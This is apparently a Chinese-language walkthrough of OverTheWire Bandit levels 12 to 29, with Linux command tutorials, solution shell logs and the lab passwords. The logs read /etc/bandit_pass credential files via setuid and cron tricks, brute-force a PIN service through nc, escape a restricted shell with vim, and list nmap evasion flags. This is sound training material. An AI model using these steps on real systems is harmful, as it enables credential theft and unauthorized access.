1234%_ad：标记下一个输出字节的序号，用十进制表示。%_ax：标记下一个输出字节的序号，用十六进制表示。%_ao：标记下一个输出字节的序号，用八进制表示。%_p：对不能以常规字符显示的用 . 代替。 同一行如果要显示多个格式字符串，则可以跟多个-e选项。 Demo: 1234hexdump -e &#x27;16/1 &quot;%02X &quot; &quot; | &quot;&#x27; -e &#x27;16/1 &quot;%_p&quot; &quot;\\n&quot;&#x27; test00 01 02 03 04 05 06 07 08 09 0A 0B 0C 0D 0E 0F | ................ 10 11 12 13 14 15 16 17 18 19 1A 1B 1C 1D 1E 1F | ................ 20 21 22 23 24 25 26 27 28 29 2A 2B 2C 2D 2E 2F | !&quot;#$%&amp;&#x27;()*+,-./ xxd xxd是二进制查看命令，默认将2文件显示为16进制字符串表示形式。 Usage: 1xxd [options] [infile [outfile]] or 1xxd -r [-s [-]offset] [-c cols] [-ps] [infile [outfile]] options: -a 缺省忽略转换: 使用‘*’替换空行. -b 二进数数据转储 (与 -ps,-i,-r不兼容). 默认为16进制. -c cols 每行多少列octets（特制8比特的字节）. 默认为16列(-i: 12, -ps: 30). -E 使用EBCDIC字符集. 默认为ASCII字符集. -e 小端模式转储 (与 -ps,-i,-r不兼容). -g 在正常输出中，每组八位字节数. 默认为2个 (-e: 4). -h 输出此帮助. -i 使用C语言文件样式输出. -r reverse operation: convert (or patch) hexdump into binary. bzip2、gzip： 解压压缩命令 Options： -d ：解压 -k：保留源文件 tar: tar可以为linux的文件和目录创建档案。利用tar，可以为某一特定文件创建档案（备份文件），也可以在档案中改变文件，或者向档案中加入新的文件。tar最初被用来在磁带上创建档案，现在，用户可以在任何设备上创建档案。利用tar命令，可以把一大堆的文件和目录全部打包成一个文件，这对于备份文件或将几个文件组合成为一个文件以便于网络传输是非常有用的。 首先要弄清两个概念：打包和压缩。打包是指将一大堆文件或目录变成一个总的文件；压缩则是将一个大的文件通过一些压缩算法变成一个小文件。 为什么要区分这两个概念呢？这源于Linux中很多压缩程序只能针对一个文件进行压缩，这样当你想要压缩一大堆文件时，你得先将这一大堆文件先打成一个包（tar命令），然后再用压缩程序进行压缩（gzip bzip2命令）。 1tar(选项)(参数) options： 1234567891011121314151617181920212223-A或--catenate：新增文件到以存在的备份文件；-B：设置区块大小；-c或--create：建立新的备份文件；-C &lt;目录&gt;：这个选项用在解压缩，若要在特定目录解压缩，可以使用这个选项。-d：记录文件的差别；-x或--extract或--get：从备份文件中还原文件；-t或--list：列出备份文件的内容；-z或--gzip或--ungzip：通过gzip指令处理备份文件；-Z或--compress或--uncompress：通过compress指令处理备份文件；-f&lt;备份文件&gt;或--file=&lt;备份文件&gt;：指定备份文件；-v或--verbose：显示指令执行过程；-r：添加文件到已经压缩的文件；-u：添加改变了和现有的文件到已经存在的压缩文件；-j：支持bzip2解压文件；-v：显示操作过程；-l：文件系统边界设置；-k：保留原有文件不覆盖；-m：保留文件不被覆盖；-w：确认压缩文件的正确性；-p或--same-permissions：用原来的文件权限还原文件；-P或--absolute-names：文件名使用绝对名称，不移除文件名称前的“/”号；-N &lt;日期格式&gt; 或 --newer=&lt;日期时间&gt;：只将较指定日期更新的文件保存到备份文件里；--exclude=&lt;范本样式&gt;：排除符合范本样式的文件。 123456789bandit12@bandit:~$ ls -altotal 24drwxr-xr-x 2 root root 4096 May 7 2020 .drwxr-xr-x 41 root root 4096 May 7 2020 ..-rw-r--r-- 1 root root 220 May 15 2017 .bash_logout-rw-r--r-- 1 root root 3526 May 15 2017 .bashrc-rw-r----- 1 bandit13 bandit12 2582 May 7 2020 data.txt-rw-r--r-- 1 root root 675 May 15 2017 .profile 查看data.txt文件后发现是二进制文件hexdump后的文件，但是该目录下我们并没有权限对该文件进行xxd操作 ls -al / root查看root目录下tmp文件我们具有权限 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253bandit12@bandit:~$ mkdir /tmp/what_a_fuckbandit12@bandit:~$ cp data.txt /tmp/what_a_fuck/data.txtbandit12@bandit:~$ cd /tmp/what_a_fuckbandit12@bandit:/tmp/what_a_fuck$ lsdata.txtbandit12@bandit:/tmp/what_a_fuck$ xxd -r data.txt &gt;data.binbandit12@bandit:/tmp/what_a_fuck$ lsdata.bin data.txtbandit12@bandit:/tmp/what_a_fuck$ file data.bindata.bin: gzip compressed data, was &quot;data2.bin&quot;, last modified: Thu May 7 18:14:30 2020, max compression, from Unixbandit12@bandit:/tmp/what_a_fuck$ mv data.bin data.gzbandit12@bandit:/tmp/what_a_fuck$ gzip -d data.gz bandit12@bandit:/tmp/what_a_fuck$ lsdata data.txtbandit12@bandit:/tmp/what_a_fuck$ file datadata: bzip2 compressed data, block size = 900kbandit12@bandit:/tmp/what_a_fuck$ mv data data.bz2bandit12@bandit:/tmp/what_a_fuck$ bzip2 -d data.bz2 bandit12@bandit:/tmp/what_a_fuck$ lsdata data.txtbandit12@bandit:/tmp/what_a_fuck$ file datadata: gzip compressed data, was &quot;data4.bin&quot;, last modified: Thu May 7 18:14:30 2020, max compression, from Unixbandit12@bandit:/tmp/what_a_fuck$ mv data data.gzbandit12@bandit:/tmp/what_a_fuck$ gzip -d data.gz bandit12@bandit:/tmp/what_a_fuck$ lsdata data.txtbandit12@bandit:/tmp/what_a_fuck$ file datadata: POSIX tar archive (GNU)bandit12@bandit:/tmp/what_a_fuck$ tar -xvf datadata5.binbandit12@bandit:/tmp/what_a_fuck$ file data5.bin data5.bin: POSIX tar archive (GNU)bandit12@bandit:/tmp/what_a_fuck$ tar -xvf data5.bin data6.binbandit12@bandit:/tmp/what_a_fuck$ file data6.bin data6.bin: bzip2 compressed data, block size = 900kbandit12@bandit:/tmp/what_a_fuck$ mv data6.bin fuck.bz2bandit12@bandit:/tmp/what_a_fuck$ bzip2 -d fuck.bz2 bandit12@bandit:/tmp/what_a_fuck$ lsdata data5.bin data.txt fuckbandit12@bandit:/tmp/what_a_fuck$ file fuckfuck: POSIX tar archive (GNU)bandit12@bandit:/tmp/what_a_fuck$ tar -xvf fuckdata8.binbandit12@bandit:/tmp/what_a_fuck$ file data8.bin data8.bin: gzip compressed data, was &quot;data9.bin&quot;, last modified: Thu May 7 18:14:30 2020, max compression, from Unixbandit12@bandit:/tmp/what_a_fuck$ mv data8.bin shit.gzbandit12@bandit:/tmp/what_a_fuck$ gzip -d shit.gz bandit12@bandit:/tmp/what_a_fuck$ file shitshit: ASCII textbandit12@bandit:/tmp/what_a_fuck$ cat shit The password is 8ZjyCRiBWFYkneahHwxCv3wb2a1ORpYL Level_13➡Level_14用所给密钥登录bandit14账号连接到主机即可 123456bandit13@bandit:~$ lssshkey.privatebandit13@bandit:~$ ssh -i sshkey.private bandit14@localhostbandit14@bandit:/etc$ cd /etc/bandit_passbandit14@bandit:/etc/bandit_pass$ cat bandit144wcYUJFw0k0XLShlDzztnTBHiqxU3b3e Level_14➡Level_15Man is a good command 🙂 Learn about ncNAME nc — arbitrary TCP and UDP connections and listens SYNOPSIS nc [-46bCDdFhklNnrStUuvZz] [-I length] [-i interval] [-M ttl] [-m minttl] [-O length] [-P proxy_username] [-p source_port] [-q seconds] [-s source] [-T keyword] [-V rtable] [-W recvlimit] [-w timeout] [-X proxy_protocol] [-x proxy_address[:port]] [-Z peercertfile] [destination] [port] DESCRIPTION The nc (or netcat) utility is used for just about anything under the sun involving TCP, UDP, or UNIX-domain sockets. It can open TCP connections, send UDP packets, listen on arbitrary TCP and UDP ports, do port scanning, and deal with both IPv4 and IPv6. Unlike telnet(1), nc scripts nicely, and separates error messages onto standard error instead of sending them to standard output, as telnet(1) does with some. Most used options -g&lt;网关&gt;：设置路由器跃程通信网关，最多设置8个; -G&lt;指向器数目&gt;：设置来源路由指向器，其数值为4的倍数; -h：在线帮助; -i&lt;延迟秒数&gt;：设置时间间隔，以便传送信息及扫描通信端口; -l：使用监听模式，监控传入的资料; -n：直接使用ip地址，而不通过域名服务器; -o&lt;输出文件&gt;：指定文件名称，把往来传输的数据以16进制字码倾倒成该文件保存; -p&lt;通信端口&gt;：设置本地主机使用的通信端口; -r：指定源端口和目的端口都进行随机的选择; -s&lt;来源位址&gt;：设置本地主机送出数据包的IP地址; -u：使用UDP传输协议; -v：显示指令执行过程; -w&lt;超时秒数&gt;：设置等待连线的时间; -z：使用0输入/输出模式，只在扫描通信端口时使用。 1234bandit14@bandit:~$ nc localhost 300004wcYUJFw0k0XLShlDzztnTBHiqxU3b3eCorrect!BfMYroe26WYalil77FoDi9qh59eK5xNr Level_15➡Level_16Learn about openssl、s_client The s_client command implements a generic SSL/TLS client which connects to a remote host using SSL/TLS. It is a very useful diagnostic tool for SSL servers. man文档写的很详细。 直接连就行 openssl s_client -connect localhost:30001 输入本关flag即可 Level_16➡Level_17What’s nmap?Name nmap - Network exploration tool and security / port scanner Synopsis nmap [Scan Type…] [Options] {target specification} Options -sT TCP connect()扫描，这种方式会在目标主机的日志中记录大批连接请求和错误信息。 -sS 半开扫描，很少有系统能把它记入系统日志。不过，需要Root权限。 -sF -sN 秘密FIN数据包扫描、Xmas Tree、Null扫描模式 -sP ping扫描，Nmap在扫描端口时，默认都会使用ping扫描，只有主机存活，Nmap才会继续扫描。 -sU UDP扫描，但UDP扫描是不可靠的 -sA 这项高级的扫描方法通常用来穿过防火墙的规则集 -sV 探测端口服务版本 -Pn 扫描之前不需要用ping命令，有些防火墙禁止ping命令。可以使用此选项进行扫描 -v 显示扫描过程，推荐使用 -h 帮助选项，是最清楚的帮助文档 -p 指定端口，如“1-65535、1433、135、22、80”等 -O 启用远程操作系统检测，存在误报 -A 全面系统检测、启用脚本检测、扫描等 -oN/-oX/-oG 将报告写入文件，分别是正常、XML、grepable 三种格式 -T4 针对TCP端口禁止动态扫描延迟超过10ms -iL 读取主机列表，例如，“-iL C:\\ip.txt” 123456789101112131415161718192021222324252627282930nmap常用参数 nmap -A IP 最常规的nmap扫描nmap -sP IP 简单扫描（simple Ping）nmap -sS IP 用SYN进行扫描，会向目标发一个小的包nmap -sT IP 用TCP进行扫描，会向目标发一个小的包nmap -sU IP 用UDP进行扫描，会向目标发一个小的包nmap -sI IP1 IP2 用伪装的IP1地址去扫描目标IP2 nmap IP ; nmap -PE IP 常规的基于ICMP ping扫描nmap -PP IP 使用ICMP时间戳扫描，可以透墙nmap -PN IP IP如看似离线、宕机，尝试此参数，不用ICMP PING来进行扫描nmap -PS IP 使用TCP SYN 扫描，不用ICMPnmap -PA IP 使用TCP ACK 扫描，不用ICMPnmap -PU IP 使用UDP 扫描，不用ICMPnmap -p 端口号 IP 扫描某IP的某端口nmap -O IP 扫描目的IP设备，系统检测查看OS等信息 nmap -sU -sT -p U:53,T:25 172.20.6.69 扫描172.20.6.69 的tcp25口，udp的53口nmap –source-port 54 172.20.6.69 用指定的端口（如54）去扫描目标IP（172.20.6.69）nmap –data-length 25 172.20.6.69 发指定长度的包去探测目标IPnmap –randomize-hosts 172.20.6.69-100 随机遍历扫描172.20.6.69-100之间的IP nmap -D RND:10 172.20.6.69 —D 诱饵选项，设定n个随机虚假的地址去扫描目标地址172.20.6.69nmap -d 172.20.6.69 debug模式扫描目标IP,可以看到每一步的进度nmap –mtu 8 172.20.6.69 设置mtu为8 ，发很小的包给172.20.6.69进行扫描，能避免大多数的防火墙的阻拦，此值只要是8的倍数就行，如16，32,40.。。。nmap -F IP 快速扫描目标IP端口，也发送很小的包给目标地址，有点类似上条 –mtu 8 nmap -oN scan.txt 172.20.6.1/24 扫描172.20.6.0网段设备，结果输出至文件sanc.txt中nmap -oX scan.xml 172.20.6.1/24 扫描172.20.6.0网段设备，结果输出至文件sanc.xml中 1nmap -sV localhost -p 31000-32000 扫出来的几个端口不多一个个试即可 1bandit16@bandit:~$ openssl s_client -connect localhost:31790 -ign_eof 输入本关密码即可得到下一关的密钥 Level_17➡Level_18用上一关private_key进行连接的时候注意一点，要用chmod改一下私钥权限 1chmod 777 rsa.priv Usage of diff1234567bandit17@bandit:~$ lspasswords.new passwords.oldbandit17@bandit:~$ diff passwords.old passwords.new42c42&lt; w0Yfolrc5bwjS4qw5mq1nnQi6mF03bii---&gt; kfBf3eYk5BPBRzwjqutbbfE887SVc5Yd Level_18➡Level_19连接到ssh后没有伪终端界面，但是我们依旧可以执行命令 12345678910111213141516ubuntu@ubuntu:~$ ssh -p2220 bandit18@bandit.labs.overthewire.org ls -alThis is a OverTheWire game server. More information on http://www.overthewire.org/wargamesbandit18@bandit.labs.overthewire.org&#x27;s password: total 24drwxr-xr-x 2 root root 4096 May 7 2020 .drwxr-xr-x 41 root root 4096 May 7 2020 ..-rw-r--r-- 1 root root 220 May 15 2017 .bash_logout-rw-r----- 1 bandit19 bandit18 3549 May 7 2020 .bashrc-rw-r--r-- 1 root root 675 May 15 2017 .profile-rw-r----- 1 bandit19 bandit18 33 May 7 2020 readmeubuntu@ubuntu:~$ ssh -p2220 bandit18@bandit.labs.overthewire.org cat readmeThis is a OverTheWire game server. More information on http://www.overthewire.org/wargamesbandit18@bandit.labs.overthewire.org&#x27;s password: IueksS7Ubh8G3DCwVzrTd8rAVOwq3M5x OR us Options: -T:禁止分配伪终端 虽然没有伪终端，但这时我们依旧可以使用shell Level_19➡Level_20Learn about chmod and setuid:chmod:(change mode）控制用户对文件的权限的命令 Linux/Unix 的文件调用权限分为三级 : 文件所有者（Owner）、用户组（Group）、其它用户（Other Users）。 只有文件所有者和超级用户可以修改文件或目录的权限。可以使用绝对模式（八进制数字模式），符号模式指定文件的权限。 1chmod [-cfvR] [--help] [--version] mode file... Options: 1[ugoa...][[+-&#x3D;][rwxX]...][,...] u 表示该文件的拥有者，g 表示与该文件的拥有者属于同一个群体(group)者，o 表示其他以外的人，a 表示这三者皆是。 + 表示增加权限、- 表示取消权限、= 表示唯一设定权限。 r 表示可读取，w 表示可写入，x 表示可执行，X 表示只有当该文件是个子目录或者该文件已经被设定过为可执行。 符号模式 使用符号模式可以设置多个项目：who（用户类型），operator（操作符）和 permission（权限），每个项目的设置可以用逗号隔开。 命令 chmod 将修改 who 指定的用户类型对文件的访问权限，用户类型由一个或者多个字母在 who 的位置来说明，如 who 的符号模式表所示: who 用户类型 说明 u user 文件所有者 g group 文件所有者所在组 o others 所有其他用户 a all 所用用户, 相当于 ugo operator 的符号模式表: Operator 说明 + 为指定的用户类型增加权限 - 去除指定用户类型的权限 = 设置指定用户权限的设置，即将用户类型的所有权限重新设置 permission 的符号模式表: 模式 名字 说明 r 读 设置为可读权限 w 写 设置为可写权限 x 执行权限 设置为可执行权限 X 特殊执行权限 只有当文件为目录文件，或者其他类型的用户有可执行权限时，才将文件权限设置可执行 s setuid/gid 当文件被执行时，根据who参数指定的用户类型设置文件的setuid或者setgid权限 t 粘贴位 设置粘贴位，只有超级用户可以设置该位，只有文件所有者u可以使用该位 八进制语法chmod命令可以使用八进制数来指定权限。文件或目录的权限位是由9个权限位来控制，每三位为一组，它们分别是文件所有者（User）的读、写、执行，用户组（Group）的读、写、执行以及其它用户（Other）的读、写、执行。历史上，文件权限被放在一个比特掩码中，掩码中指定的比特位设为1，用来说明一个类具有相应的优先级。 # 权限 rwx 二进制 7 读 + 写 + 执行 rwx 111 6 读 + 写 rw- 110 5 读 + 执行 r-x 101 4 只读 r– 100 3 写 + 执行 -wx 011 2 只写 -w- 010 1 只执行 –x 001 0 无 — 000 Demo: chmod 765 所有者的权限用数字表达：属主的那三个权限位的数字加起来的总和。如 rwx ，也就是 4+2+1 ，应该是 7。 用户组的权限用数字表达：属组的那个权限位数字的相加的总和。如 rw- ，也就是 4+2+0 ，应该是 6。 其它用户的权限数字表达：其它用户权限位的数字相加的总和。如 r-x ，也就是 4+0+1 ，应该是 5。 Demo: 将文件 file1.txt 设为所有人皆可读取 : 1chmod ugo+r file1.txt 将文件 file1.txt 设为所有人皆可读取 : 1chmod a+r file1.txt 将文件 file1.txt 与 file2.txt 设为该文件拥有者，与其所属同一个群体者可写入，但其他以外的人则不可写入 : 1chmod ug+w,o-w file1.txt file2.txt 为 ex1.py 文件拥有者增加可执行权限: 1chmod u+x ex1.py 将目前目录下的所有文件与子目录皆设为任何人可读取 : 1chmod -R a+r * setuid: SUID 特殊权限仅适用于可执行文件，所具有的功能是，只要用户对设有 SUID 的文件有执行权限，那么当用户执行此文件时，会以文件所有者的身份去执行此文件，一旦文件执行结束，身份的切换也随之消失。 所以我们以bandit20身份cat flag即可 123456789bandit19@bandit:~$ ./bandit20-do Run a command as another user. Example: ./bandit20-do idbandit19@bandit:~$ ./bandit20-do iduid=11019(bandit19) gid=11019(bandit19) euid=11020(bandit20) groups=11019(bandit19)bandit19@bandit:~$ cat /etc/bandit_pass/bandit20cat: /etc/bandit_pass/bandit20: Permission deniedbandit19@bandit:~$ ./bandit20-do cat /etc/bandit_pass/bandit20GbKksEFF4yrVs6il55v6gwY5aVje5f0j Level_20➡Level_21其实就是开启多个shell窗口用nc在同一个端口下通信: Terminal 1 (host): 1234bandit20@melinda:~$ nc -nvlp 44444Listening on [0.0.0.0] (family 0, port 44444)GbKksEFF4yrVs6il55v6gwY5aVje5f0jgE269g2h3mw3pwgrj0Ha9Uoqen1c9DGr &#x2F;&#x2F;get flag Terminal 2 (client): 12bandit20@melinda:~$ .&#x2F;suconnect 44444Read: GbKksEFF4yrVs6il55v6gwY5aVje5f0j Level_21➡Level_22Learn about crontab:crontab是一个可以根据时间、日期、月份、星期的组合调度对重复任务的执行的守护进程。 crontab文件中，每一行代表一个任务；每行有六列，每列代表一项设置，前五列为时间频率设定，第六列是要执行的任务。 1minute hour day mouth week command #分 时 日 月 周 命令 minute表示分钟，可以是059的任意整数。 hour表示小时，可以是223的任意整数 day表示日期，可以是131的任意整数 month表示月份，可以是112的任意整数 week表示星期几，可以是0~7之间的整数，0或者7表示星期天 command表示执行的命令 上面的设置除了数字之外还可以使用特殊字符： 星号*：表示所有可能的值，可以理解每隔。 逗号,：用逗号隔开的值表示一个列表范围，如1,2,3 * * * *每天每小时的第一、第二、第三分钟。 中杠-：用中杠隔开的值表示一个数值范围，如1-10 * * * *每天每小时的1到10分钟。 正斜线/：指定执行任务的间隔频率，如 0 10-18/2 * * *每天的十点到十八点间隔2小时执行。 Demo: 12345678910111213141516171819202122232425262728# 每分钟执行一次* * * * * # 每小时的第3和第15分钟执行3,15 * * * *#在上午的8点到11点的第3和第15分钟执行3,15 8-11 * * *#在每隔2天的上午8点和11点的第3和第15分钟执行3,15 8-11 */2 * *#每个星期一的上午8点到11点的第3和第15分钟执行3,15 8-11 * * 1#每晚的21：30执行30 21 * * *#每月1、10、22日的4:30执行30 4 1,10,22 * *#每周六、日1:10执行10 1 * * 6,7#每天18:00到23:00之间每隔30分钟执行0/30 18-23 * * *#星期六的23:00执行0 23 * * 6#每小时执行一次* */1 * * *#晚上11点到早上7点之间，每小时执行一次* 23-7/1 * * *#每月的4号与每周一到周三的11点0 11 4 * 1-3#一月一号的4点0 4 1 1 * Cron also offers some special strings, which can be used in place of the five time-and-date fields: string meaning @reboot Run once, at startup. @yearly Run once a year, “0 0 1 1 *”. @annually (same as @yearly) @monthly Run once a month, “0 0 1 * *”. @weekly Run once a week, “0 0 * * 0”. @daily Run once a day, “0 0 * * *”. @midnight (same as @daily) @hourly Run once an hour, “0 * * * *”. 1234567891011121314151617181920bandit21@bandit:~$ cd /etc/cron.dbandit21@bandit:/etc/cron.d$ lscronjob_bandit15_root cronjob_bandit22 cronjob_bandit24cronjob_bandit17_root cronjob_bandit23 cronjob_bandit25_rootbandit21@bandit:/etc/cron.d$ cat cronjob_bandit_bandit22cat: cronjob_bandit_bandit22: No such file or directorybandit21@bandit:/etc/cron.d$ cat cronjob_bandit_22cat: cronjob_bandit_22: No such file or directorybandit21@bandit:/etc/cron.d$ cat cronjob_bandit22@reboot bandit22 /usr/bin/cronjob_bandit22.sh &amp;&gt; /dev/null* * * * * bandit22 /usr/bin/cronjob_bandit22.sh &amp;&gt; /dev/nullbandit21@bandit:/etc/cron.d$ lscronjob_bandit15_root cronjob_bandit22 cronjob_bandit24cronjob_bandit17_root cronjob_bandit23 cronjob_bandit25_rootbandit21@bandit:/etc/cron.d$ cat /usr/bin/cronjob_bandit22.sh#!/bin/bashchmod 644 /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgvcat /etc/bandit_pass/bandit22 &gt; /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgvbandit21@bandit:/etc/cron.d$ cat /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgvYk7owGAcWjwMVRwrTesJEwB7WVOiILLI Level_22➡Level_23Learn about md5sum and command cut:MD5算法常常被用来验证网络文件传输的完整性，防止文件被人篡改。MD5 全称是报文摘要算法（Message-Digest Algorithm 5），此算法对任意长度的信息逐位进行计算，产生一个二进制长度为128位（十六进制长度就是32位）的“指纹”（或称“报文摘要”），不同的文件产生相同的报文摘要的可能性是非常非常之小的。 cut命令用于显示每行从开头算起 num1 到 num2 的文字。 cut 命令从文件的每一行剪切字节、字符和字段并将这些字节、字符和字段写至标准输出。 如果不指定 File 参数，cut 命令将读取标准输入。必须指定 -b、-c 或 -f 标志之一。 Options: -b ：以字节为单位进行分割。这些字节位置将忽略多字节字符边界，除非也指定了 -n 标志。 -c ：以字符为单位进行分割。 -d ：自定义分隔符，默认为制表符。 -f ：与-d一起使用，指定显示哪个区域。 -n ：取消分割多字节字符。仅和 -b 标志一起使用。如果字符的最后一个字节落在由 -b 标志的 List 参数指示的范围之内，该字符将被写出；否则，该字符将被排除 12345678910111213141516171819202122232425262728293031323334bandit22@bandit:~$ cd /etc/cron.dbandit22@bandit:/etc/cron.d$ lscronjob_bandit15_root cronjob_bandit22 cronjob_bandit24cronjob_bandit17_root cronjob_bandit23 cronjob_bandit25_rootbandit22@bandit:/etc/cron.d$ cat cronjob_bandit23@reboot bandit23 /usr/bin/cronjob_bandit23.sh &amp;&gt; /dev/null* * * * * bandit23 /usr/bin/cronjob_bandit23.sh &amp;&gt; /dev/nullbandit22@bandit:/etc/cron.d$ cat /usr/bin/cronjob_bandit23.sh#!/bin/bashmyname=$(whoami)mytarget=$(echo I am user $myname | md5sum | cut -d &#x27; &#x27; -f 1)echo &quot;Copying passwordfile /etc/bandit_pass/$myname to /tmp/$mytarget&quot;cat /etc/bandit_pass/$myname &gt; /tmp/$mytargetbandit22@bandit:/etc/cron.d$ whoamibandit22bandit22@bandit:/etc/cron.d$ ls -altotal 36drwxr-xr-x 2 root root 4096 Jul 11 2020 .drwxr-xr-x 87 root root 4096 May 14 2020 ..-rw-r--r-- 1 root root 62 May 14 2020 cronjob_bandit15_root-rw-r--r-- 1 root root 62 Jul 11 2020 cronjob_bandit17_root-rw-r--r-- 1 root root 120 May 7 2020 cronjob_bandit22-rw-r--r-- 1 root root 122 May 7 2020 cronjob_bandit23-rw-r--r-- 1 root root 120 May 14 2020 cronjob_bandit24-rw-r--r-- 1 root root 62 May 14 2020 cronjob_bandit25_root-rw-r--r-- 1 root root 102 Oct 7 2017 .placeholderbandit22@bandit:/etc/cron.d$ echo I am user bandit23| md5sum8ca319486bfbbc3663ea0fbe81326349 -bandit22@bandit:/etc/cron.d$ cat /tmp/8ca319486bfbbc3663ea0fbe81326349jc1udXuA1tiHqjIsL8yaapX5XIAI6i0nbandit22@bandit:/etc/cron.d$ Descriptions: md5sum: 显示或检查 MD5(128-bit) 校验和,若没有文件选项，或者文件处为”-“，则从标准输入读取。echo -n : 不打印换行符。(注意: echo -n 后面的-n参数必须加上, 这样算出的字符串的md5值才正确)cut: cut用来从标准输入或文本文件中剪切列或域。剪切文本可以将之粘贴到一个文本文件。 -d 指定与空格和tab键不同的域分隔符。-f1 表示第一个域。 Level_23➡Level_24Ez_shell_code 123456789101112131415161718#!/bin/bashmyname=$(whoami)cd /var/spool/$mynameecho &quot;Executing and deleting all scripts in /var/spool/$myname:&quot;for i in * .*;do if [ &quot;$i&quot; != &quot;.&quot; -a &quot;$i&quot; != &quot;..&quot; ]; then echo &quot;Handling $i&quot; owner=&quot;$(stat --format &quot;%U&quot; ./$i)&quot; if [ &quot;$&#123;owner&#125;&quot; = &quot;bandit23&quot; ]; then timeout -s 9 60 ./$i fi rm -f ./$i fidone Analyse: shell脚本分析： 间隔时间执行/var/spool/bandit24 目录下的文件然后删除 我们编写个shell脚本输出即可 12bandit23@bandit:/var/spool/bandit24$ vim fuck.shbandit23@bandit:/var/spool/bandit24$ chmod 777 fuck.sh fuck.sh 1cat /etc/bandit_pass/bandit24 &gt; /tmp/i_got_it 12bandit23@bandit:~$ cat /tmp/i_got_itUoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ Level_24➡Level_25basic_shell 123456789#! /bin/bashpass24=&quot;UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ&quot;nc localhost 30002for i in &#123;0..9&#125;&#123;0..9&#125;&#123;0..9&#125;&#123;0..9&#125;do echo $pass24&#x27; &#x27;$i &gt;&gt; dictdonecat ./dict | nc localhost 30002 &gt;&gt; resort re | uniq -u Level_25➡Level_26Tips:The shell for user bandit26 is not /bin/bash 根据提示我们查看bandit26的/etc/passwd 文件 Learn about the passwd12345678910 passwd文件是以行为单位的配置文件，每行定义系统上的一个用户，行内分为字段，字段之间由一个冒号隔开。这些字段依次为：用户名：密码：用户ID：主要组ID：GECOS：主目录：登录shell字段解释：用户名：就是一个用户名，登录时候用的密码：在旧的UNIX系统上，这个字段含有用户的加密密码，为了安全性，现在的linux均显示为x或*号用户ID：linux内核用于识别用户的一个整数ID主要组ID：linux内核用于识别用户主要组的一个整数IDGECOS：用户全名，安装linux时如果不输入全名，则显示为跟用户名一样，如果输入，则显示为全名（不可用于登录）主目录：用户登录时，他的登录Shell将使用这个目录作为当前工作目录登录Shell：用户登录时的默认Shell，在redhat 企业版中，登录shell通常是&#x2F;bin&#x2F;bash Three types of users: 123456 3种类型的用户普通用户：普通用户是使用系统真实用户人群。普通用户通常把&#x2F;bin&#x2F;bash作为登录Shell和&#x2F;home的子目录作为主目录。一般情况下，普通用户只在自己的主目录和系统范围内的临时目录里（如&#x2F;tmp和&#x2F;var&#x2F;tmp）创建文件。在redhat企业版linux中，普通用户的用户ID数通常大于500. root用户：用户ID为0的用户，也被称为超级用户，root用户在系统上拥有完全权限，可以修改和删除任何文件，可以运行任何命令，可以取消任何进程。root用户负责增加和保留其他用户、配置硬件、添加系统软件。虽然root用户可以在系统上的任何地方创建文件，但它也通常使用&#x2F;root作为主目录 系统用户：大多数linux系统保留一系列低UID值用户作为系统用户，系统用户不代表人，而代表系统的组成部分。例如，运行Apache网络服务器的进程经常作为用户apache（ 见上面的passwd文件中apache用户信息）来运行。系统用户一般没有登录Shell，因为它不代表实际登录的用户。同样，系统用户的主目录很少在&#x2F;home中，而通常在属于相关应用的系统目录中。例如，用户apache的主目录是&#x2F;var&#x2F;www。在redhat企业版linux中，系统用户的UID值范围在1-499之间。 123456789bandit25@bandit:~$ cat /etc/passwd|grep bandit26bandit26:x:11026:11026:bandit level 26:/home/bandit26:/usr/bin/showtextbandit25@bandit:~$ cat /usr/bin/showtext#!/bin/shexport TERM=linuxmore ~/text.txtexit 0 将命令窗口调最小自动触发more，然后修改shell为bash即可 1234567# 按下v键进入vi编辑模式，然后更改shell为bash即可:set shell sh=/bin/bash #vim命令设置shell:sh #vim中执行shellbandit26@bandit:~$ cat /etc/bandit_pass/bandit265czgV9L3Xx8JPOyRbXh6lQbmIOWvPT6Z Level_26➡Level_27和上一关差不多。 12:set shell=/bin/sh:sh 进入后: 12bandit26@bandit:~$ ./bandit27-do cat /etc/bandit_pass/bandit273ba3118a22e93127a4ed485be72ef5ea Level_27➡Level_28Learn about Git参阅阮一峰这篇： clink_me git clone 克隆一个项目： 12345678bandit27@bandit:/tmp/what_a_fuck$ git clone ssh://bandit27-git@localhost/home/bandit27-git/repobandit27@bandit:/tmp/what_a_fuck$ lsrepobandit27@bandit:/tmp/what_a_fuck$ cd repo/bandit27@bandit:/tmp/what_a_fuck/repo$ lsREADMEbandit27@bandit:/tmp/what_a_fuck/repo$ cat READMEThe password to the next level is: 0ef186ac70e04ea33b4c1853d2526fa2 Level_28➡Level_29和上一关差不多，但并没有直接给flag，可以利用git log 命令查看修改信息： 123456789101112131415161718bandit28@bandit:/tmp/what_a_fuck/repo$ git logcommit edd935d60906b33f0619605abd1689808ccdd5eeAuthor: Morla Porla &lt;morla@overthewire.org&gt;Date: Thu May 7 20:14:49 2020 +0200 fix info leak #修复信息泄露commit c086d11a00c0648d095d04c089786efef5e01264Author: Morla Porla &lt;morla@overthewire.org&gt;Date: Thu May 7 20:14:49 2020 +0200 add missing data #添加缺少的信息commit de2ebe2d5fd1598cd547f4d56247e053be3fdc38Author: Ben Dover &lt;noone@overthewire.org&gt;Date: Thu May 7 20:14:49 2020 +0200 initial commit of README.md #最初的信息 很明显比较修复信息泄露的提交和上一个提交即可 1234567891011bandit28@bandit:/tmp/what_a_fuck/repo$ git diff c086 edd9diff --git a/README.md b/README.mdindex 3f7cee8..5c6457b 100644--- a/README.md+++ b/README.md@@ -4,5 +4,5 @@ Some notes for level29 of bandit. ## credentials - username: bandit29-- password: bbc96594b4e001778eee9975372716b2+- password: xxxxxxxxxx Level_29➡Level_30Learn about branch of git:官方文档：yyds :)阅读官方文档的时候英语的作用就体现出来了 12345678910111213141516171819202122232425262728293031323334353637383940bandit29@bandit:/tmp/what_a_fuck/repo$ git branch -a #查看所有分支* master remotes/origin/HEAD -&gt; origin/master remotes/origin/dev remotes/origin/master remotes/origin/sploits-devbandit29@bandit:/tmp/what_a_fuck/repo$ git checkout dev #切换到其他分支Switched to branch &#x27;dev&#x27;bandit29@bandit:/tmp/what_a_fuck/repo$ git logcommit bc833286fca18a3948aec989f7025e23ffc16c07Author: Morla Porla 